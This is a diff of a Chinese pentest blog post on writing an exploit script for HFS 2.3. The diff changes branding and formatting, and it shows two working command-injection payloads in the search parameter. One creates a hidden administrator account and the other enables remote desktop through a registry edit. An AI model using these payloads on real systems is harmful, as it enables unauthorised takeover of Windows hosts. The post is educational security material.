@@ -2,20 +2,20 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安全开发-HFS漏洞利用脚本编写 | Laosec@Falao</title>
+  <title>安全开发-HFS漏洞利用脚本编写 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="安全开发-HFS漏洞利用脚本编写 | Laosec@Falao">
+  <meta name="description" content="安全开发-HFS漏洞利用脚本编写 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
 <meta property="og:url" content="http://example.com/about/index.html">
-<meta property="og:site_name" content="Laosec@Falao">
+<meta property="og:site_name" content="Falao&#39;s Blog">
 <meta property="og:description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-01-15T05:05:54.000Z">
 <meta property="article:modified_time" content="2021-01-15T05:07:45.429Z">
-<meta property="article:author" content="法老">
+<meta property="article:author" content="Falao">
 <meta name="twitter:card" content="summary">
 
 
@@ -64,7 +64,7 @@
          src="/img/hong.jpg"/>
 </a>
 <div class="author">
-    <span>法老</span>
+    <span>Falao</span>
 </div>
 
 <div class="icon">
@@ -377,7 +377,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-25 18:00:59'>2021-01-25 16:08</time>
+            Created At : <time class="date" title='Updated At: 2021-01-26 10:12:15'>2021-01-25 16:08</time>
         
     </div>
     <div class="article-meta">
@@ -421,12 +421,18 @@
 <p>攻击者环境：Python3 requests库</p>
 <p>靶机环境：开启HFS~网络文件服务器 2.3Beta</p>
 </blockquote>
-<h3 id="二：攻击准备"><a href="#二：攻击准备" class="headerlink" title="二：攻击准备"></a>二：攻击准备</h3><blockquote>
-<p>添加用户EXP：/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D</p>
-</blockquote>
-<blockquote>
-<p>开启3389EXP：/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D</p>
-</blockquote>
+<h3 id="二：攻击准备"><a href="#二：攻击准备" class="headerlink" title="二：攻击准备"></a>二：攻击准备</h3><ul>
+<li>添加用户EXP：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?search==%<span class="number">00</span>%7B.exec%7Ccmd.exe%<span class="number">20</span>/c%20net%20user%20TechSupport%20comeonbaby%<span class="number">20</span>/add%<span class="number">20</span>%<span class="number">26</span>%20net%20localgroup%20administrators%20TechSupport%<span class="number">20</span>/add.%7D</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>开启3389EXP：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?search==%<span class="number">00</span>%7B.exec%7Ccmd.exe%<span class="number">20</span>/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%<span class="number">22</span>%<span class="number">20</span>%22Server%<span class="number">20</span>/v%20fDenyTSConnections%<span class="number">20</span>/t%20REG_DWORD%<span class="number">20</span>/d%<span class="number">2000000000</span>%<span class="number">20</span>/f.%7D</span><br></pre></td></tr></table></figure>
+
+
 <h3 id="三：脚本开发思路"><a href="#三：脚本开发思路" class="headerlink" title="三：脚本开发思路"></a>三：脚本开发思路</h3><ol>
 <li>接受输入的漏洞地址</li>
 <li>组合漏洞地址并请求</li>
@@ -496,7 +502,7 @@
 </div>
 
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 <script src="/js/jquery.pjax.js?v=1.1.0" ></script>
 
 <script src="/js/script.js?v=1.1.0" ></script>
